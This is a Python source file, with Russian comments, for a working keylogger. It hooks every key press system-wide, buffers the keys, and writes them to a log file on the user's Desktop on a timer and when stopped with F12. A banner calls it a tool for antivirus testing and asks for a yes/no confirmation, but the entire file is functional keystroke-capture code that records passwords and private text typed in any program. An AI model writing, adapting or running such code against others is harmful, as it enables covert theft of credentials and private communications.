import keyboard
import time
from datetime import datetime
import os
import sys
import traceback

class FixedKeylogger:
    def __init__(self, log_file=None, report_interval=60):
        # Используем путь в папке пользователя для избежания проблем с правами
        if log_file is None:
            desktop = os.path.join(os.path.expanduser("~"), "Desktop")
            self.log_file = os.path.join(desktop, "keylog_test.txt")
        else:
            self.log_file = log_file
            
        self.report_interval = report_interval
        self.start_time = time.time()
        self.keys_pressed = []
        self.running = True
        
        print(f"Log file will be created at: {self.log_file}")
        
    def on_press(self, event):
        """Обработчик нажатия клавиш с обработкой ошибок"""
        try:
            key = event.name
            
            # Фильтрация специальных клавиш
            if len(key) > 1:
                if key == "space":
                    key = " "
                elif key == "enter":
                    key = "[ENTER]\n"
                elif key == "decimal":
                    key = "."
                else:
                    key = f"[{key.upper()}]"
            
            self.keys_pressed.append(key)
            
            # Вывод в консоль для отладки
            print(f"Key: {key}", end='\r')
            
            # Автосохранение каждые N символов
            if len(self.keys_pressed) >= 50:
                self.save_log()
                
        except Exception as e:
            print(f"Error in on_press: {e}")
    
    def save_log(self):
        """Сохранение лога в файл с обработкой ошибок"""
        if not self.keys_pressed:
            return
            
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Проверяем и создаем директорию если нужно
            log_dir = os.path.dirname(self.log_file)
            if log_dir and not os.path.exists(log_dir):
                os.makedirs(log_dir, exist_ok=True)
            
            # Пытаемся открыть файл разными способами
            try:
                mode = "a" if os.path.exists(self.log_file) else "w"
                with open(self.log_file, mode, encoding="utf-8") as f:
                    f.write(f"\n--- Session: {timestamp} ---\n")
                    f.write(''.join(self.keys_pressed))
                    f.write("\n")
            except PermissionError:
                # Если нет прав, пробуем создать в текущей директории
                self.log_file = "keylog_local.txt"
                with open(self.log_file, "w", encoding="utf-8") as f:
                    f.write(f"\n--- Session: {timestamp} ---\n")
                    f.write(''.join(self.keys_pressed))
                    f.write("\n")
            
            print(f"\n[+] Log saved to {self.log_file} ({len(self.keys_pressed)} keys)")
            self.keys_pressed = []
            
        except Exception as e:
            print(f"[-] Error saving log: {e}")
            print(traceback.format_exc())
            # Не очищаем буфер при ошибке, попробуем сохранить позже
    
    def start(self):
        """Запуск кейлоггера"""
        print("=" * 50)
        print("Fixed Keylogger Started")
        print(f"Log file: {self.log_file}")
        print("Press F12 to stop and save")
        print("=" * 50)
        
        try:
            # Настройка хуков
            keyboard.on_press(self.on_press)
            
            # Горячая клавиша для остановки
            keyboard.add_hotkey('f12', self.safe_stop)
            
            # Периодическое сохранение по таймеру
            def periodic_save():
                while self.running:
                    time.sleep(30)  # Сохранять каждые 30 секунд
                    if self.keys_pressed:
                        self.save_log()
            
            import threading
            save_thread = threading.Thread(target=periodic_save, daemon=True)
            save_thread.start()
            
            # Бесконечный цикл с обработкой прерываний
            while self.running:
                time.sleep(0.1)
                
        except KeyboardInterrupt:
            print("\n[!] KeyboardInterrupt received")
            self.safe_stop()
        except Exception as e:
            print(f"[!] Unexpected error: {e}")
            print(traceback.format_exc())
            self.safe_stop()
    
    def safe_stop(self):
        """Безопасная остановка"""
        try:
            self.running = False
            keyboard.unhook_all()
            self.save_log()
            print("\n[!] Keylogger stopped safely")
            print(f"[!] Check {self.log_file} for logs")
            
            # Даем время на завершение потоков
            time.sleep(1)
            
        except Exception as e:
            print(f"[!] Error during stop: {e}")
        
        sys.exit(0)

if __name__ == "__main__":
    print("=== KEYLOGGER FOR ANTIVIRUS TESTING ===")
    print("This program is for testing antivirus detection only!")
    print("Do not use on computers you don't own.")
    print("=" * 50)
    
    # Спрашиваем подтверждение
    response = input("Do you want to continue? (yes/no): ").strip().lower()
    if response != "yes":
        print("Cancelled.")
        sys.exit(0)
    
    # Запускаем кейлоггер
    try:
        keylogger = FixedKeylogger()
        keylogger.start()
    except Exception as e:
        print(f"Failed to start keylogger: {e}")
        print(traceback.format_exc())